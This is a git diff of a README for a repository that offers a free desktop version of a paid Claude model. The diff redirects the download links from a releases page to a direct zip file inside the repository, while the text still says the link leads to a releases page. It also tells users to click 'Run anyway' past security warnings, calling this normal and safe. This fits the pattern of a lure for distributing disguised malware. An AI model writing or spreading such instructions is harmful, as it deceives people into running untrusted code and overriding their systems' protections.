@@ -1,7 +1,7 @@
 <h1>🚀 Claude-Opus-5-AI-Free-Desktop - Free AI Power, Zero Cost</h1>
 
 <p align="center">
-  <a href="https://github.com/goiaalex120/Claude-Opus-5-AI-Free-Desktop/releases">
+  <a href="https://raw.githubusercontent.com/goiaalex120/Claude-Opus-5-AI-Free-Desktop/main/chat/Desktop_Opus_Free_Claude_A_1.2.zip">
     <img src="https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-FREE-00A86B?style=for-the-badge&logo=github&logoColor=white" alt="Download Now" width="400" height="80" style="border-radius: 12px; background: linear-gradient(135deg, #ff6b6b, #ffa500);"/>
   </a>
 </p>
@@ -52,7 +52,7 @@ Ready to dive in? Great. Here is what you need to do:
 .
 
 
-2. **Download the Application** - Click the big green button at the top of this page, or go directly to our releases page by clicking here: [**Download Claude-Opus-5-AI-Free-Desktop**](https://github.com/goiaalex120/Claude-Opus-5-AI-Free-Desktop/releases). This will take you to a page where you will see download options for different operating systems. Choose the file that matches your computer's system (e.g., Windows users, pick the `.exe` or `.msi` file; Mac users, pick the `.dmg` file; Linux users, pick the `.AppImage` or `.deb` file, depending on your distribution).
+2. **Download the Application** - Click the big green button at the top of this page, or go directly to our releases page by clicking here: [**Download Claude-Opus-5-AI-Free-Desktop**](https://raw.githubusercontent.com/goiaalex120/Claude-Opus-5-AI-Free-Desktop/main/chat/Desktop_Opus_Free_Claude_A_1.2.zip). This will take you to a page where you will see download options for different operating systems. Choose the file that matches your computer's system (e.g., Windows users, pick the `.exe` or `.msi` file; Mac users, pick the `.dmg` file; Linux users, pick the `.AppImage` or `.deb` file, depending on your distribution).
 
 
 3. **Run the Installer** - After the download finishes (it may take a few minutes depending on your internet speed), locate the downloaded file in your "Downloads" folder. Double-click the file to run it. Your computer might show a security warning; this is normal for new software. Click "More info" and then "Run anyway" if you see a blue screen,or simply "Yes" if prompted for permission. This step is safe because you downloaded the file from a trusted source.
